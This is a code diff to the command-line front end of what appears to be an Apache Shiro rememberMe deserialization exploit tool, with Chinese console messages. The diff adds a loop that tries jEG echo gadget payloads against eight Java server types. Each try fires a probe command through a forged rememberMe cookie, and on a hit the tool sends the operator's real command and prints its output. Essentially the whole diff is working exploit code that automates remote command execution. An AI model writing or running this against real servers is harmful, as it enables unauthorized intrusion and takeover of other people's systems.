@@ -153,25 +153,44 @@ public class MainCLI {
         String gadget = cli.opt("-g");
         String echo = cli.opt("-e");
         if (echo == null || echo.isEmpty()) echo = "AllEcho";
+        String serverType = cli.opt("--server");
 
         if (jegMode) {
-            EchoGenerateResult jegResult = as.generateEchoWithThirdParty(
-                    "jEG", "SERVER_TOMCAT", "MODEL_CMD", "FORMAT_BASE64",
-                    gadget, echo, key, command, "");
-            if (!jegResult.isSuccess() || jegResult.getPayload() == null) {
-                System.out.println(jegResult.isSuccess() ? "jEG 生成失败，payload 为空" : "jEG 生成失败: " + jegResult.getMessage());
-                return;
+            String[] servers = serverType != null && !serverType.isEmpty()
+                    ? new String[]{serverType}
+                    : new String[]{"SERVER_TOMCAT", "SERVER_SPRING_MVC", "SERVER_RESIN", "SERVER_WEBLOGIC", "SERVER_JETTY", "SERVER_WEBSPHERE", "SERVER_UNDERTOW", "SERVER_GLASSFISH"};
+            String host = extractHost(as.url);
+            String probeCmd = "echo \"Host: " + host + "\"";
+            EchoGenerateResult jegResult = null;
+            for (String srv : servers) {
+                jegResult = as.generateEchoWithThirdParty(
+                        "jEG", srv, "MODEL_CMD", "FORMAT_BASE64",
+                        gadget, echo, key, probeCmd, "");
+                if (jegResult.isSuccess() && jegResult.getPayload() != null) {
+                    String cookieLine = AttackService.resolveRememberMeCookieLine(jegResult.getPayload(), jegResult.getRequestHeaderName());
+                    if (cookieLine != null) {
+                        String probeResult = as.sendRememberMeCookieExploitWithCmd(cookieLine, probeCmd, true, null);
+                        if (AttackService.responseIndicatesGadgetHit(probeResult)) {
+                            // 命中，用实际命令执行
+                            jegResult = as.generateEchoWithThirdParty(
+                                    "jEG", srv, "MODEL_CMD", "FORMAT_BASE64",
+                                    gadget, echo, key, command, "");
+                            if (jegResult.isSuccess() && jegResult.getPayload() != null) {
+                                cookieLine = AttackService.resolveRememberMeCookieLine(jegResult.getPayload(), jegResult.getRequestHeaderName());
+                                if (cookieLine != null) {
+                                    AttackService.attackRememberMe = cookieLine;
+                                    String result = as.sendRememberMeCookieExploitWithCmd(cookieLine, command, true, null);
+                                    if (result != null) {
+                                        System.out.println(result);
+                                    }
+                                    return;
+                                }
+                            }
+                        }
+                    }
+                }
             }
-            String cookieLine = AttackService.resolveRememberMeCookieLine(jegResult.getPayload(), jegResult.getRequestHeaderName());
-            if (cookieLine == null) {
-                System.out.println("jEG payload 无法转为 rememberMe Cookie");
-                return;
-            }
-            AttackService.attackRememberMe = cookieLine;
-            String result = as.sendRememberMeCookieExploitWithCmd(cookieLine, command, true, null);
-            if (result != null) {
-                System.out.println(result);
-            }
+            System.out.println("jEG 所有服务端类型均未命中");
             return;
         }
 
@@ -267,6 +286,16 @@ public class MainCLI {
     }
 
     // --- Helpers ---
+
+    private static String extractHost(String url) {
+        try {
+            java.net.URL u = new java.net.URL(url);
+            return u.getPort() > 0 && u.getPort() != u.getDefaultPort()
+                    ? u.getHost() + ":" + u.getPort() : u.getHost();
+        } catch (Exception e) {
+            return "127.0.0.1";
+        }
+    }
 
     private static String escapeJson(String s) {
         if (s == null) return "null";
